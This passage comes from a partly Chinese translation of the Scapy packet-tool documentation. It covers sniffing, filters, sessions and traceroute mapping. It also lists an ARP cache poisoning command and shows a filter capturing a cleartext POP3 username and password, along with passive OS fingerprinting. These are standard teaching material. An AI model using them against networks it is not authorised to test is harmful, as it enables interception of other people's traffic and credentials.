answer each time</span><br><span class="line">srploop          : Send a packet at layer <span class="number">2</span> <span class="keyword">in</span> loop <span class="keyword">and</span> <span class="keyword">print</span> the answer each time</span><br><span class="line">sniff            : Sniff packets</span><br><span class="line">p0f              : Passive OS fingerprinting: which OS emitted this TCP SYN ?</span><br><span class="line">arpcachepoison   : Poison target<span class="string">'s cache with (your MAC,victim'</span>s IP) couple</span><br><span class="line">send             : Send packets at layer <span class="number">3</span></span><br><span class="line">sendp            : Send packets at layer <span class="number">2</span></span><br><span class="line">traceroute       : Instant TCP traceroute</span><br><span class="line">arping           : Send ARP who-has requests to determine which hosts are up</span><br><span class="line">ls               : List  available layers, <span class="keyword">or</span> infos on a given layer</span><br><span class="line">lsc              : List user commands</span><br><span class="line">queso            : Queso OS fingerprinting</span><br><span class="line">nmap_fp          : nmap fingerprinting</span><br><span class="line">report_ports     : portscan a target <span class="keyword">and</span> output a LaTeX table</span><br><span class="line">dyndns_add       : Send a DNS add message to a nameserver <span class="keyword">for</span> <span class="string">"name"</span> to have a new <span class="string">"rdata"</span></span><br><span class="line">dyndns_del       : Send a DNS delete message to a nameserver <span class="keyword">for</span> <span class="string">"name"</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Scapy 同样可以使用 GeoIP2 模块, 结合 matplotlib 和 <a href="http://scitools.org.uk/cartopy/docs/latest/installing.html" target="_blank" rel="noopener">cartopy</a> 可以生成如下有趣的图片:</p>
<p><img src="traceroute_worldplot.png" alt="_images/traceroute_worldplot.png"></p>
<p>在这个例子中，我们使用了 traceroute_map() 函数来绘制图片，这个函数使用了 TracerouteResultobjects 中的 world_trace 函数，当然他可以有其他的用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.geoip_city = <span class="string">"path/to/GeoLite2-City.mmdb"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = traceroute([<span class="string">"www.google.co.uk"</span>, <span class="string">"www.secdev.org"</span>], verbose=<span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.world_trace()</span><br></pre></td></tr></table></figure>

<p>或者:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.geoip_city = <span class="string">"path/to/GeoLite2-City.mmdb"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>traceroute_map([<span class="string">"www.google.co.uk"</span>, <span class="string">"www.secdev.org"</span>])</span><br></pre></td></tr></table></figure>

<p>确保你安装了 <a href="https://pypi.python.org/pypi/geoip2" target="_blank" rel="noopener">geoip2</a> , <a href="https://dev.maxmind.com/geoip/geoip2/geolite2/" target="_blank" rel="noopener">以及它的数据库</a> (<a href="https://geolite.maxmind.com/download/geoip/database/GeoLite2-City.tar.gz" target="_blank" rel="noopener">direct download</a>) 和 <a href="http://scitools.org.uk/cartopy/docs/latest/installing.html" target="_blank" rel="noopener">cartopy</a> 模块来使用这一功能.</p>
<h3 id="Configuring-super-sockets"><a href="#Configuring-super-sockets" class="headerlink" title="Configuring super sockets"></a>Configuring super sockets</h3><p>Different super sockets are available in Scapy: the <strong>native</strong> ones, and the ones that use <strong>libpcap</strong> (to send/receive packets).</p>
<p>By default, Scapy will try to use the native ones (<em>except on Windows, where the winpcap/npcap ones are preferred</em>). To manually use the <strong>libpcap</strong> ones, you must:</p>
<ul>
<li>On Unix/OSX: be sure to have libpcap installed.</li>
<li>On Windows: have Npcap/Winpcap installed. (default)</li>
</ul>
<p>Then use:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.use_pcap = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>This will automatically update the sockets pointing to <code>conf.L2socket</code> and <code>conf.L3socket</code>.</p>
<p>If you want to manually set them, you have a bunch of sockets available, depending on your platform. For instance, you might want to use:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.L3socket=L3pcapSocket  <span class="comment"># Receive/send L3 packets through libpcap</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.L2listen=L2ListenTcpdump  <span class="comment"># Receive L2 packets through TCPDump</span></span><br></pre></td></tr></table></figure>

<h3 id="Sniffing"><a href="#Sniffing" class="headerlink" title="Sniffing"></a>Sniffing</h3><p> 我们可以简单地捕获数据包，或者是克隆tcpdump或tethereal的功能。如果没有指定interface，则会 按照<code>conf.iface</code> 的设置进行嗅探：:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span> sniff(filter=<span class="string">"icmp and host 66.35.250.151"</span>, count=<span class="number">2</span>)</span><br><span class="line">&lt;Sniffed: UDP:<span class="number">0</span> TCP:<span class="number">0</span> ICMP:<span class="number">2</span> Other:<span class="number">0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> a=_</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> a.nsummary()</span><br><span class="line"><span class="number">0000</span> Ether / IP / ICMP <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> echo-request <span class="number">0</span> / Raw</span><br><span class="line"><span class="number">0001</span> Ether / IP / ICMP <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> echo-request <span class="number">0</span> / Raw</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> a[<span class="number">1</span>]</span><br><span class="line">&lt;Ether dst=<span class="number">00</span>:ae:f3:<span class="number">52</span>:aa:d1 src=<span class="number">00</span>:<span class="number">02</span>:<span class="number">15</span>:<span class="number">37</span>:a2:<span class="number">44</span> type=<span class="number">0x800</span> |&lt;IP version=<span class="number">4L</span></span><br><span class="line"> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">84</span> id=<span class="number">0</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=ICMP chksum=<span class="number">0x3831</span></span><br><span class="line"> src=<span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> dst=<span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> options=<span class="string">''</span> |&lt;ICMP type=echo-request code=<span class="number">0</span></span><br><span class="line"> chksum=<span class="number">0x6571</span> id=<span class="number">0x8745</span> seq=<span class="number">0x0</span> |&lt;Raw load=<span class="string">'B\xf7g\xda\x00\x07um\x08\t\n\x0b</span></span><br><span class="line"><span class="string"> \x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d</span></span><br><span class="line"><span class="string"> \x1e\x1f !\x22#$%&amp;\'()*+,-./01234567'</span> |&gt;&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(iface=<span class="string">"wifi0"</span>, prn=<span class="keyword">lambda</span> x: x.summary())</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">8</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info <span class="number">133</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">4</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Probe Request / Info SSID / Info Rates</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">5</span> <span class="number">00</span>:<span class="number">0</span>a:<span class="number">41</span>:ee:a5:<span class="number">50</span> / <span class="number">802.11</span> Probe Response / Info SSID / Info Rates / Info DSset / Info <span class="number">133</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">4</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Probe Request / Info SSID / Info Rates</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">4</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Probe Request / Info SSID / Info Rates</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">8</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info <span class="number">133</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">11</span> <span class="number">00</span>:<span class="number">07</span>:<span class="number">50</span>:d6:<span class="number">44</span>:<span class="number">3</span>f / <span class="number">802.11</span> Authentication</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">11</span> <span class="number">00</span>:<span class="number">0</span>a:<span class="number">41</span>:ee:a5:<span class="number">50</span> / <span class="number">802.11</span> Authentication</span><br><span class="line"><span class="number">802.11</span> Management <span class="number">0</span> <span class="number">00</span>:<span class="number">07</span>:<span class="number">50</span>:d6:<span class="number">44</span>:<span class="number">3</span>f / <span class="number">802.11</span> Association Request / Info SSID / Info Rates / Info <span class="number">133</span> / Info <span class="number">149</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">1</span> <span class="number">00</span>:<span class="number">0</span>a:<span class="number">41</span>:ee:a5:<span class="number">50</span> / <span class="number">802.11</span> Association Response / Info Rates / Info <span class="number">133</span> / Info <span class="number">149</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">8</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info <span class="number">133</span></span><br><span class="line"><span class="number">802.11</span> Management <span class="number">8</span> ff:ff:ff:ff:ff:ff / <span class="number">802.11</span> Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info <span class="number">133</span></span><br><span class="line"><span class="number">802.11</span> / LLC / SNAP / ARP who has <span class="number">172.20</span><span class="number">.70</span><span class="number">.172</span> says <span class="number">172.20</span><span class="number">.70</span><span class="number">.171</span> / Padding</span><br><span class="line"><span class="number">802.11</span> / LLC / SNAP / ARP <span class="keyword">is</span> at <span class="number">00</span>:<span class="number">0</span>a:b7:<span class="number">4</span>b:<span class="number">9</span>c:dd says <span class="number">172.20</span><span class="number">.70</span><span class="number">.172</span> / Padding</span><br><span class="line"><span class="number">802.11</span> / LLC / SNAP / IP / ICMP echo-request <span class="number">0</span> / Raw</span><br><span class="line"><span class="number">802.11</span> / LLC / SNAP / IP / ICMP echo-reply <span class="number">0</span> / Raw</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(iface=<span class="string">"eth1"</span>, prn=<span class="keyword">lambda</span> x: x.show())</span><br><span class="line">---[ Ethernet ]---</span><br><span class="line">dst       = <span class="number">00</span>:ae:f3:<span class="number">52</span>:aa:d1</span><br><span class="line">src       = <span class="number">00</span>:<span class="number">02</span>:<span class="number">15</span>:<span class="number">37</span>:a2:<span class="number">44</span></span><br><span class="line">type      = <span class="number">0x800</span></span><br><span class="line">---[ IP ]---</span><br><span class="line">   version   = <span class="number">4L</span></span><br><span class="line">   ihl       = <span class="number">5L</span></span><br><span class="line">   tos       = <span class="number">0x0</span></span><br><span class="line">   len       = <span class="number">84</span></span><br><span class="line">   id        = <span class="number">0</span></span><br><span class="line">   flags     = DF</span><br><span class="line">   frag      = <span class="number">0L</span></span><br><span class="line">   ttl       = <span class="number">64</span></span><br><span class="line">   proto     = ICMP</span><br><span class="line">   chksum    = <span class="number">0x3831</span></span><br><span class="line">   src       = <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span></span><br><span class="line">   dst       = <span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span></span><br><span class="line">   options   = <span class="string">''</span></span><br><span class="line">---[ ICMP ]---</span><br><span class="line">      type      = echo-request</span><br><span class="line">      code      = <span class="number">0</span></span><br><span class="line">      chksum    = <span class="number">0x89d9</span></span><br><span class="line">      id        = <span class="number">0xc245</span></span><br><span class="line">      seq       = <span class="number">0x0</span></span><br><span class="line">---[ Raw ]---</span><br><span class="line">         load      = <span class="string">'B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\'()*+,-./01234567'</span></span><br><span class="line">---[ Ethernet ]---</span><br><span class="line">dst       = <span class="number">00</span>:<span class="number">02</span>:<span class="number">15</span>:<span class="number">37</span>:a2:<span class="number">44</span></span><br><span class="line">src       = <span class="number">00</span>:ae:f3:<span class="number">52</span>:aa:d1</span><br><span class="line">type      = <span class="number">0x800</span></span><br><span class="line">---[ IP ]---</span><br><span class="line">   version   = <span class="number">4L</span></span><br><span class="line">   ihl       = <span class="number">5L</span></span><br><span class="line">   tos       = <span class="number">0x0</span></span><br><span class="line">   len       = <span class="number">84</span></span><br><span class="line">   id        = <span class="number">2070</span></span><br><span class="line">   flags     =</span><br><span class="line">   frag      = <span class="number">0L</span></span><br><span class="line">   ttl       = <span class="number">42</span></span><br><span class="line">   proto     = ICMP</span><br><span class="line">   chksum    = <span class="number">0x861b</span></span><br><span class="line">   src       = <span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span></span><br><span class="line">   dst       = <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span></span><br><span class="line">   options   = <span class="string">''</span></span><br><span class="line">---[ ICMP ]---</span><br><span class="line">      type      = echo-reply</span><br><span class="line">      code      = <span class="number">0</span></span><br><span class="line">      chksum    = <span class="number">0x91d9</span></span><br><span class="line">      id        = <span class="number">0xc245</span></span><br><span class="line">      seq       = <span class="number">0x0</span></span><br><span class="line">---[ Raw ]---</span><br><span class="line">         load      = <span class="string">'B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\'()*+,-./01234567'</span></span><br><span class="line">---[ Padding ]---</span><br><span class="line">            load      = <span class="string">'\n_\x00\x0b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(iface=[<span class="string">"eth1"</span>,<span class="string">"eth2"</span>], prn=<span class="keyword">lambda</span> x: x.sniffed_on+<span class="string">": "</span>+x.summary())</span><br><span class="line">eth3: Ether / IP / ICMP <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> &gt; <span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> echo-request <span class="number">0</span> / Raw</span><br><span class="line">eth3: Ether / IP / ICMP <span class="number">66.35</span><span class="number">.250</span><span class="number">.151</span> &gt; <span class="number">192.168</span><span class="number">.5</span><span class="number">.21</span> echo-reply <span class="number">0</span> / Raw</span><br><span class="line">eth2: Ether / IP / ICMP <span class="number">192.168</span><span class="number">.5</span><span class="number">.22</span> &gt; <span class="number">66.35</span><span class="number">.250</span><span class="number">.152</span> echo-request <span class="number">0</span> / Raw</span><br><span class="line">eth2: Ether / IP / ICMP <span class="number">66.35</span><span class="number">.250</span><span class="number">.152</span> &gt; <span class="number">192.168</span><span class="number">.5</span><span class="number">.22</span> echo-reply <span class="number">0</span> / Raw</span><br></pre></td></tr></table></figure>

<p> 对于控制输出信息，我们可以使用<code>sprintf()</code>函数： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts = sniff(prn=<span class="keyword">lambda</span> x:x.sprintf(<span class="string">"&#123;IP:%IP.src% -&gt; %IP.dst%\n&#125;&#123;Raw:%Raw.load%\n&#125;"</span>))</span><br><span class="line">192.168.1.100 -&gt; 64.233.167.99</span><br><span class="line"></span><br><span class="line">64.233.167.99 -&gt; 192.168.1.100</span><br><span class="line"></span><br><span class="line">192.168.1.100 -&gt; 64.233.167.99</span><br><span class="line"></span><br><span class="line">192.168.1.100 -&gt; 64.233.167.99</span><br><span class="line"><span class="string">'GET / HTTP/1.1\r\nHost: 64.233.167.99\r\nUser-Agent: Mozilla/5.0</span></span><br><span class="line"><span class="string">(X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy)</span></span><br><span class="line"><span class="string">Firefox/2.0.0.8\r\nAccept: text/xml,application/xml,application/xhtml+xml,</span></span><br><span class="line"><span class="string">text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language:</span></span><br><span class="line"><span class="string">en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset:</span></span><br><span class="line"><span class="string">ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 300\r\nConnection:</span></span><br><span class="line"><span class="string">keep-alive\r\nCache-Control: max-age=0\r\n\r\n'</span></span><br></pre></td></tr></table></figure>

<p> 我们可以嗅探并进行被动操作系统指纹识别： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p</span><br><span class="line">&lt;Ether dst=<span class="number">00</span>:<span class="number">10</span>:<span class="number">4</span>b:b3:<span class="number">7</span>d:<span class="number">4</span>e src=<span class="number">00</span>:<span class="number">40</span>:<span class="number">33</span>:<span class="number">96</span>:<span class="number">7</span>b:<span class="number">60</span> type=<span class="number">0x800</span> |&lt;IP version=<span class="number">4L</span></span><br><span class="line"> ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">60</span> id=<span class="number">61681</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=TCP chksum=<span class="number">0xb85e</span></span><br><span class="line"> src=<span class="number">192.168</span><span class="number">.8</span><span class="number">.10</span> dst=<span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span> options=<span class="string">''</span> |&lt;TCP sport=<span class="number">46511</span> dport=<span class="number">80</span></span><br><span class="line"> seq=<span class="number">2023566040L</span> ack=<span class="number">0L</span> dataofs=<span class="number">10L</span> reserved=<span class="number">0L</span> flags=SEC window=<span class="number">5840</span></span><br><span class="line"> chksum=<span class="number">0x570c</span> urgptr=<span class="number">0</span> options=[(<span class="string">'Timestamp'</span>, (<span class="number">342940201L</span>, <span class="number">0L</span>)), (<span class="string">'MSS'</span>, <span class="number">1460</span>),</span><br><span class="line"> (<span class="string">'NOP'</span>, ()), (<span class="string">'SAckOK'</span>, <span class="string">''</span>), (<span class="string">'WScale'</span>, <span class="number">0</span>)] |&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>load_module(<span class="string">"p0f"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p0f(p)</span><br><span class="line">(<span class="number">1.0</span>, [<span class="string">'Linux 2.4.2 - 2.4.14 (1)'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=sniff(prn=prnp0f)</span><br><span class="line">(<span class="number">1.0</span>, [<span class="string">'Linux 2.4.2 - 2.4.14 (1)'</span>])</span><br><span class="line">(<span class="number">1.0</span>, [<span class="string">'Linux 2.4.2 - 2.4.14 (1)'</span>])</span><br><span class="line">(<span class="number">0.875</span>, [<span class="string">'Linux 2.4.2 - 2.4.14 (1)'</span>, <span class="string">'Linux 2.4.10 (1)'</span>, <span class="string">'Windows 98 (?)'</span>])</span><br><span class="line">(<span class="number">1.0</span>, [<span class="string">'Windows 2000 (9)'</span>])</span><br></pre></td></tr></table></figure>

<p> 猜测操作系统版本前的数字为猜测的精确度。 </p>
<h3 id="Asynchronous-Sniffing"><a href="#Asynchronous-Sniffing" class="headerlink" title="Asynchronous Sniffing"></a>Asynchronous Sniffing</h3><p>注意</p>
<p>Asynchronous sniffing 只用于 <strong>Scapy 2.4.3</strong> 及以上版本</p>
<p>你可以异步的使用 sniffer . 这样 sniffer 就可以被程序化的终止，而非总是使用ctrl^C.我们提供了 <code>start()</code>, <code>stop()</code> 和 <code>join()</code> 方法.</p>
<p>基础用法如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = AsyncSniffer()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.start()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"hey"</span>)</span><br><span class="line">hey</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>results = t.stop()</span><br></pre></td></tr></table></figure>

<p><img src="animation-scapy-asyncsniffer.svg" alt="_images/animation-scapy-asyncsniffer.svg"></p>
<p> <code>AsyncSniffer</code> 类有一些有用的关键字, 比如 <code>results</code> (收集到的数据包) 或 <code>running</code>, 这些都是可用的. 他接受与 <code>sniff()</code> 相同的参数(实际上，他们的实现是相结合的)。例如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = AsyncSniffer(iface=<span class="string">"enp0s3"</span>, count=<span class="number">200</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.start()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.join()  <span class="comment"># this will hold until 200 packets are collected</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>results = t.results</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(len(results))</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure>

<p>另一个例子: 使用 <code>prn</code> 和 <code>store=False</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = AsyncSniffer(prn=<span class="keyword">lambda</span> x: x.summary(), store=<span class="literal">False</span>, filter=<span class="string">"tcp"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.start()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>time.sleep(<span class="number">20</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.stop()</span><br></pre></td></tr></table></figure>

<h3 id="Advanced-Sniffing-Sniffing-Sessions"><a href="#Advanced-Sniffing-Sniffing-Sessions" class="headerlink" title="Advanced Sniffing - Sniffing Sessions"></a>Advanced Sniffing - Sniffing Sessions</h3><p>注意</p>
<p>Sessions 只用于 <strong>Scapy 2.4.3</strong> 及以上版本</p>
<p><code>sniff()</code> 同样提供 <strong>Sessions</strong> 服务, 这使得数据包可以被无缝剖析. 打个比方, 你想在执行 <code>prn</code>之前用<code>sniff(prn=...)</code> 来自动整理IP数据包 .</p>
<p>Scapy 包含了一些基础的 Sessions, 但同样可以被自定义. 默认的有如下:</p>
<ul>
<li><code>IPSession</code> -&gt; <em>defragment IP packets</em> on-the-flow, to make a stream usable by <code>prn</code>.</li>
<li><code>TCPSession</code> -&gt; <em>defragment certain TCP protocols*</em>. Only <strong>HTTP 1.0</strong> currently uses this functionality.</li>
<li><code>NetflowSession</code> -&gt; <em>resolve Netflow V9 packets</em> from their NetflowFlowset information objects</li>
</ul>
<p>使用 <code>sniff()</code> 的 <code>session=</code> 参数来使用他们:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(session=IPSession, iface=<span class="string">"eth0"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(session=TCPSession, prn=<span class="keyword">lambda</span> x: x.summary(), store=<span class="literal">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(offline=<span class="string">"file.pcap"</span>, session=NetflowSession)</span><br></pre></td></tr></table></figure>

<p>注意</p>
<p>如果要为了支持其他 flow-based 的协议自定义 Session 类,可以简单地从 <a href="https://github.com/secdev/scapy/blob/master/scapy/sessions.py" target="_blank" rel="noopener">scapy/sessions.py</a> 中复制一份样例。 你的自定义 <code>Session</code> 类只用拓展 <code>DefaultSession</code> 类, 并自定义其中的on_packet_received` 函数即可, 如例中所示。</p>
<h3 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h3><p> 演示一下bpf过滤器和sprintf()方法： </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=sniff(filter=<span class="string">"tcp and ( port 25 or port 110 )"</span>,</span><br><span class="line"> prn=<span class="keyword">lambda</span> x: x.sprintf(<span class="string">"%IP.src%:%TCP.sport% -&gt; %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"</span>))</span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110   S :</span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226  SA :</span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110   A :</span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226  PA : +OK &lt;13103.1048117923@pop2-1.free.fr&gt;</span><br><span class="line"></span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110   A :</span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110  PA : USER toto</span><br><span class="line"></span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226   A :</span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226  PA : +OK</span><br><span class="line"></span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110   A :</span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110  PA : PASS tata</span><br><span class="line"></span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226  PA : -ERR authorization failed</span><br><span class="line"></span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110   A :</span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226  FA :</span><br><span class="line">192.168.8.10:47226 -&gt; 213.228.0.14:110  FA :</span><br><span class="line">213.228.0.14:110 -&gt; 192.168.8.10:47226   A :</span><br></pre></td></tr></table></figure>

<h3 id="Send-and-receive-in-a-loop"><a href="#Send-and-receive-in-a-loop" class="headerlink" title="Send and receive in a loop"></a>Send and receive in a loop</h3><p> 这儿有一个例子来实现类似(h)ping的功能：你一直发送同样的数据包集合来观察是否发生变化： </p>
